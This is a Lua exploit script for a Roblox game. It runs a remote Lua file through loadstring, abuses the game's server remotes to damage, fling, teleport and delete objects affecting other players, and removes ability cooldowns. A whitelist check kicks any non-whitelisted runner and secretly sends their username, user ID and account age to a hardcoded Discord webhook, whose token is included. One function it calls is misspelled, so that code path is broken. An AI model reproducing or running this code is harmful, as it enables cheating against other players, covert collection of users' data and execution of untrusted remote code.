local IMPORTANT = game.ReplicatedStorage.Part
local classname = "firecrackerminigun"
local pass = getsenv(game.Players.LocalPlayer.PlayerGui.LocalProjectile).pass
local plr = game:GetService("Players").LocalPlayer
local charr = plr.Character
local hum = charr.Humanoid
local rt = hum.RootPart
local name = plr.Name
local a
local notification =
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Kaiddd/notificationstuff/main/src.lua", true))()
local function notify(title, duration)
    notification(
        {
            Text = title,
            Duration = duration
        }
    )
end

if plr.PlayerGui:FindFirstChild("ClassGui") then
    a = getsenv(plr.PlayerGui.ClassGui.Main)
else
    notify("you need to choose a class first")
end

function getpass()
    return pass
end

function fling(plr, ty, pwr, pwr2)
    pass = getpass()

    game.ReplicatedStorage.Remotes.EffectApply:InvokeServer(pass(), plr, ty, plr.Head, pwr, pwr2)
end

function tp(plr, cf)
    pass = getpass()
    local args = {
        [1] = pass(),
        [2] = plr,
        [3] = "SafeTeleport",
        [4] = cf
    }
    game:GetService("ReplicatedStorage").Remotes.EffectApply:InvokeServer(unpack(args))
end

function ok(part, pathh)
    pcall(
        function()
            pass = getpass()
            local args = {
                [1] = pass(),
                [2] = game.Workspace.NormalDummy3,
                [3] = part,
                [4] = pathh
            }

            game:GetService("ReplicatedStorage").Remotes.EffectApply:InvokeServer(unpack(args))
        end
    )
end

function del(part)
    ok(game.ReplicatedStorage.Effects.StealthWarning.Effect, part)
end

local function GetClosest()
    LocalPlayer = game.Players.LocalPlayer
    local Character = LocalPlayer.Character
    local HumanoidRootPart = Character and Character:FindFirstChild("HumanoidRootPart")
    if not (Character or HumanoidRootPart) then
        return
    end

    local TargetDistance = math.huge
    local team
    if workspace[LocalPlayer.Name]:FindFirstChild("Red") then
        team = "Red"
    elseif workspace[LocalPlayer.Name]:FindFirstChild("Blue") then
        team = "Blue"
    end
    if team == nil then
        for i, v in ipairs(workspace:GetChildren()) do
            local stats = v:FindFirstChild("Stats")
            if stats then
                local hp = stats:FindFirstChild("CurrentHP")
                if hp.Value > 0 then
                    if
                        v ~= Character and v:FindFirstChild("HumanoidRootPart") and not v.Name:find("ability") and
                            v:FindFirstChild("Playing") or
                            v.Name:find("Dummy") and not v:FindFirstChild("Playing")
                     then
                        local TargetHRP = v:FindFirstChild("HumanoidRootPart")
                        if TargetHRP and HumanoidRootPart then
                            local mag = (HumanoidRootPart.Position - TargetHRP.Position).magnitude
                            if mag < TargetDistance then
                                TargetDistance = mag
                                Target = v
                            end
                        end
                    end
                end
            end
        end
    else
        for i, v in ipairs(workspace:GetChildren()) do
            local stats = v:FindFirstChild("Stats")
            if stats then
                local hp = stats:FindFirstChild("CurrentHP")
                if hp.Value > 0 then
                    if
                        v ~= Character and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Playing") and
                            not v:FindFirstChild(team) or
                            v.Name:find("Dummy")
                     then
                        local TargetHRP = v:FindFirstChild("HumanoidRootPart")
                        if TargetHRP and HumanoidRootPart then
                            local mag = (HumanoidRootPart.Position - TargetHRP.Position).magnitude
                            if mag < TargetDistance then
                                TargetDistance = mag
                                Target = v
                            end
                        end
                    end
                end
            end
        end
    end
    return Target.HumanoidRootPart
end

local roundDecimals = function(num, places)
    places = math.pow(10, places or 0)
    num = num * places

    if num >= 0 then
        num = math.floor(num + 0.5)
    else
        num = math.ceil(num - 0.5)
    end

    return num / places
end
function damage(chara, amount)
    local pass = getpass()
    if pass == nil then
        return
    end
    game.ReplicatedStorage.Remotes.Damage:InvokeServer(pass(), game.Workspace.RealTime.Value, chara, amount)
end
local canatk = true
local canab1 = true
local canab2 = true
local cancrit = true
local ab1inter = false
times = 0
function cooling(move, timee)
    spawn(
        function()
            local nameof
            if move == "atk" then
                canatk = false
                nameof = "Attack"
            elseif move == "ab1" then
                canab1 = false
                nameof = "Ability1"
            elseif move == "ab2" then
                canab2 = false
                nameof = "Ability2"
            elseif move == "crit" then
                cancrit = false
                nameof = "Critical"
            end
            local moves = game:GetService("Players")[name].PlayerGui.ClassGui.MainHUD.Abilites
            moves[nameof].Icon.ImageTransparency = .5
            local timer = timee
            if move ~= "ab1" then
                while true do
                    moves[nameof].CooldownDisplay.Text = roundDecimals(timer, 1)
                    timer = timer - .1
                    if timer <= 0 then
                        moves[nameof].Icon.ImageTransparency = 0
                        moves[nameof].CooldownDisplay.Text = ""
                        if move == "atk" then
                            canatk = true
                        elseif move == "ab1" then
                            canab1 = true
                        elseif move == "ab2" then
                            canab2 = true
                        elseif move == "crit" then
                            cancrit = true
                        end
                        break
                    end
                    task.wait(.1)
                end
            else
                if times < 2 then
                    if ab1inter then
                        while true do
                            if not ab1inter and times < 2 then
                                break
                            end
                            moves[nameof].CooldownDisplay.Text = roundDecimals(timer, 1)
                            timer = timer - .1
                            if timer <= 0 then
                                moves[nameof].Icon.ImageTransparency = 0
                                moves[nameof].CooldownDisplay.Text = ""
                                if move == "atk" then
                                    canatk = true
                                elseif move == "ab1" then
                                    canab1 = true
                                elseif move == "ab2" then
                                    canab2 = true
                                elseif move == "crit" then
                                    cancrit = true
                                end
                                break
                            end
                            task.wait(.1)
                        end
                    else
                        while not ab1inter do
                            if abinter and times < 2 then
                                break
                            end
                            moves[nameof].CooldownDisplay.Text = roundDecimals(timer, 1)
                            timer = timer - .1
                            if timer <= 0 then
                                moves[nameof].Icon.ImageTransparency = 0
                                moves[nameof].CooldownDisplay.Text = ""
                                if move == "atk" then
                                    canatk = true
                                elseif move == "ab1" then
                                    canab1 = true
                                elseif move == "ab2" then
                                    canab2 = true
                                elseif move == "crit" then
                                    cancrit = true
                                end
                                ab1inter = false
                                break
                            end
                            task.wait(.1)
                        end
                    end
                else
                    times = 0
                    timer = 5
                    while true do
                        moves[nameof].CooldownDisplay.Text = roundDecimals(timer, 1)
                        timer = timer - .1
                        if timer <= 0 then
                            moves[nameof].Icon.ImageTransparency = 0
                            moves[nameof].CooldownDisplay.Text = ""
                            if move == "atk" then
                                canatk = true
                            elseif move == "ab1" then
                                canab1 = true
                            elseif move == "ab2" then
                                canab2 = true
                            elseif move == "crit" then
                                cancrit = true
                            end
                            break
                        end
                        task.wait(.1)
                    end
                end
            end
        end
    )
end

local chosen
function yescreateproj(projpath, cf, tobe, dam, col)
    spawn(
        function()
            local l__Remotes__13 = game.ReplicatedStorage.Remotes
            local l__LocalPlayer__2 = game.Players.LocalPlayer
            local l__Character__4 = l__LocalPlayer__2.Character
            local l__ability2b__41 = projpath
            local v42 = cf
            local v43 = l__ability2b__41:Clone()
            v43.Owner.Value = l__LocalPlayer__2
            v43.Origin.Value = v42.p
            v43.CFrame = v42
            v43.Color = col or l__LocalPlayer__2.CharacterColors.WeaponColor.Value
            v43.Speed.Value = v43.Speed.Value
            v43.Damage.Value = dam or v43.Damage.Value
            local t = v43.Transparency
            for _, v in pairs(v43:GetChildren()) do
                if v.Name == "ProjectileHandler" then
                    local l__ProjectileHandler__44 = v
                    v.Projectile.Value = v43
                    v.Parent = l__Character__4
                    if v43.Name == "ability2b" then
                        v.Disabled = true
                    end
                end
            end
            if v43.Name == "ability2b" then
                chosen = v43
            end
            v43.Parent = workspace
            l__Remotes__13.Projectile:FireServer(
                l__ability2b__41,
                v42,
                col or l__LocalPlayer__2.CharacterColors.WeaponColor.Value
            )
            spawn(
                function()
                    if tobe then
                        local oldcf = v43.CFrame
                        local oldpos
                        task.wait()
                        repeat
                            oldcf = v43.CFrame
                            task.wait()
                        until v43.Parent == nil or t ~= v43.Transparency
                        tobe(oldcf)
                    end
                end
            )
        end
    )
end

function nocreateproj(projpath, cf, mag, dam)
    local l__Remotes__13 = game.ReplicatedStorage.Remotes
    local l__LocalPlayer__2 = game.Players[name]
    local l__Character__4 = l__LocalPlayer__2.Character
    local l__ability2b__41 = projpath
    local v42 = cf
    local v43 = l__ability2b__41:Clone()
    v43.Owner.Value = l__LocalPlayer__2
    v43.Origin.Value = v42.p
    v43.CFrame = v42
    v43.Color = l__LocalPlayer__2.CharacterColors.WeaponColor.Value
    v43.Speed.Value = v43.Speed.Value
    local l__ProjectileHandler__44 = v43.ProjectileHandler
    l__ProjectileHandler__44.Projectile.Value = v43
    l__ProjectileHandler__44.Parent = l__Character__4
    v43.Parent = workspace
    l__Remotes__13.Projectile:FireServer(l__ability2b__41, v42, l__LocalPlayer__2.CharacterColors.WeaponColor.Value)
    for _, v in pairs(game.Workspace:GetChildren()) do
        if v:FindFirstChildWhichIsA("Humanoid") then
            spawn(
                function()
                    if v.Name ~= name then
                        if math.abs((v.HumanoidRootPart.Position - v43.Position).Magnitude) <= mag then
                            damage(v, dam)
                        end
                    end
                end
            )
        end
    end
end

function dash(poww)
    spawn(
        function()
            local l__Character__4 = game.Players.LocalPlayer.Character
            local v40 = Instance.new("BodyVelocity")
            v40.MaxForce = Vector3.new(99999999, 0, 99999999)
            v40.Velocity = l__Character__4.HumanoidRootPart.CFrame.lookVector * Vector3.new(poww, 0, poww)
            if l__Character__4.Humanoid.MoveDirection.magnitude == 0 then
                v40.Velocity = l__Character__4.HumanoidRootPart.CFrame.lookVector * poww
            end
            v40.Parent = l__Character__4.HumanoidRootPart
            task.wait(0.2)
            v40:Destroy()
        end
    )
end

if a then
    a.usingattack = function()
        if canatk and plr.Character.Stats.Disable.Value == 0 then
            cooling("atk", 1)
        else
            return
        end
    end

    a.usingability1 = function()
        if canab1 and plr.Character.Stats.Disable.Value == 0 then
            cooling("ab1", 1)
        else
            return
        end
    end

    a.usingability2 = function()
        if canab2 and plr.Character.Stats.Disable.Value == 0 then
            cooling("ab2", 1)
        else
            return
        end
    end

    a.usingcritical = function()
        if cancrit and plr.Character.Stats.Disable.Value == 0 then
            cooling("crit", 1)
        else
            return
        end
    end
end

local function sendhook()
    local webhookcheck =
        is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
        secure_load and "Sentinel" or
        KRNL_LOADED and "Krnl" or
        SONA_LOADED and "Sona" or
        "Kid with shit exploit"

    local url =
        "https://discord.com/api/webhooks/1052161747831767040/bu3UXvnMyvOyKy5LKOD1bukf8RkQLHng06c3LAMoMPfovyww4JGLhES5zf7Km-vaGfOP"
    local data = {
        ["embeds"] = {
            {
                ["title"] = "unknown runner",
                ["description"] = "Username: " ..
                    game.Players.LocalPlayer.Name .. " with **" .. webhookcheck .. "** \n" .. classname,
                ["type"] = "rich",
                ["color"] = tonumber(0x7269da),
                ["fields"] = {
                    {
                        ["name"] = "Name:",
                        ["value"] = tostring(game.Players.LocalPlayer.Name),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "age",
                        ["value"] = tostring(game.Players.LocalPlayer.AccountAge),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Id",
                        ["value"] = tostring(game.Players.LocalPlayer.UserId),
                        ["inline"] = true
                    }
                }
            }
        }
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)

    local headers = {
        ["content-type"] = "application/json"
    }
    local request
    if webhookcheck == "Synapse X" then
        request = syn.request
    else
        request = request or http_request or HttpPost or syn.request
    end

    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
end

function removewhitelist()
    if plr.PlayerData.Inventory:FindFirstChild("took_mytime") then
        ok(plr.PlayerData.Inventory.took_mytime, workspace.Blocker)

        local whitelist = workspace.Blocker:WaitForChild("took_mytime")
        for _, v in pairs(game:GetService("Workspace").Lobby.TokenShop.Shop.EventToken:GetChildren()) do
            ok(v, whitelist)
        end

        task.wait(1)
        local args = {
            [1] = "PointTrade",
            [2] = whitelist
        }

        game:GetService("ReplicatedStorage").Remotes.Shop:FireServer(unpack(args))
    end
end

local players = {}

if not players[1] then
    players[1] = "took_mytime"
end

for _, v in pairs(players) do
    if plr.Name ~= v then
        if
            not game.Players.LocalPlayer.PlayerData.Inventory:FindFirstChild("took_mytime") or
                not game.Players.LocalPlayer.PlayerData.Inventory:FindFirstChild(IMPORTANT.Name)
         then
            removewhistlist()
            plr:Kick(
                "invalid player ran the script (oh, also i logged you)\n add rogue#2257 on discord for a whitelist (or just ask in game, i have to know who is running this one way or another)"
            )
            sendhook()
        end
    end
end
